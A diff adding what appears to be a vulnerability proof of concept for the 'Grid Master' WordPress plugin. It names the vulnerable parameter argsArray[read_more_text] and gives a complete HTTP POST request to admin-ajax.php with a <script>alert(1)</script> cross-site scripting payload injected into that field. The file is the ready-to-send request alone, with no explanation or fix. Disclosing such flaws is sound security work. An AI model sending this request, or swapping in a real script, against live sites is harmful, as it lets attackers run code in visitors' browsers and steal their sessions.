@@ -1,0 +1,24 @@
+VULNERABLE PLUGIN: Grid Master 
+VULNERABLE PARAMETER: argsArray[read_more_text]
+
+
+POST /wp-admin/admin-ajax.php HTTP/2
+Host: host.com
+Cookie: nitroCachedPage=0
+Content-Length: 1206
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: pt-BR,pt;q=0.9
+Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Accept: /
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: https://host.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+action=asr_filter_posts&nonce=cff5abb1b5&term_ID=&taxInput=tax_input%255Bcategory%255D%255B%255D%3D35&layout=1&argsArray%5Bpost_type%5D=post&argsArray%5Bposts_per_page%5D=6&argsArray%5Borderby%5D=date&argsArray%5Border%5D=DESC&argsArray%5Btitle_length%5D=50&argsArray%5Bcontent_from%5D=excerpt&argsArray%5Bexcerpt_type%5D=words&argsArray%5Bexcerpt_length%5D=15&argsArray%5Bshow_read_more%5D=yes&argsArray%5Bread_more_text%5D=<script>alert(1)</script>&argsArray%5Bshow_filter%5D=yes&argsArray%5Bbtn_all%5D=yes&argsArray%5Bcat%5D=&argsArray%5Bpaginate%5D=no&argsArray%5Bhide_empty%5D=0&argsArray%5Bpagination_type%5D=&argsArray%5Binfinite_scroll%5D=&argsArray%5Banimation%5D=&argsArray%5Bgrid_style%5D=style-3&argsArray%5Bgrid_id%5D=gm-4QVxqDGO&argsArray%5Btaxonomy%5D=category&argsArray%5Bterms%5D=28%2C29%2C30%2C31%2C33%2C34%2C35%2C36%2C37&argsArray%5Bgrid_image_size%5D=full&argsArray%5Bfilter_heading%5D=&argsArray%5Btoggle_filter_items%5D=&argsArray%5Bid%5D=0&argsArray%5Bgrid_image_width%5D=350&argsArray%5Bgrid_image_height%5D=200&argsArray%5Bmultiple_select%5D=no&argsArray%5Btitle_tag%5D=&argsArray%5Binitial_term%5D=&argsArray%5Blink_thumbnail%5D=&argsArray%5Blink_thumbnail_to%5D=&pagination_type=
